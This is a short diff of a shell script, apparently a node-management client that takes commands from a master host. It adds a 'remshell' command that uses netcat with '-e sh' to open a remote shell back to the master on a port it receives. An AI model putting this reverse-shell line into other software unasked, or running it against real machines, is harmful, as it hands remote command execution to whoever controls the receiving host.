@@ -86,6 +86,7 @@ checkinstalled() {
 # gets a trace of all the commands that are getting executed, printed to stderr
 set -x
 send "Hello World"
+send "IS_REMSHELL"
 makenode
 checkinstalled
 
@@ -124,6 +125,12 @@ do
         send "IS_UNINSTALLED" 
         break
     	;;
+    remshell)
+	localport="`recv`"
+	nc $master $localport -e sh
+	send "IS_REMSHELL"
+	break
+	;;
     *)
         send "Sorry don't know how to do $req"
         ;;
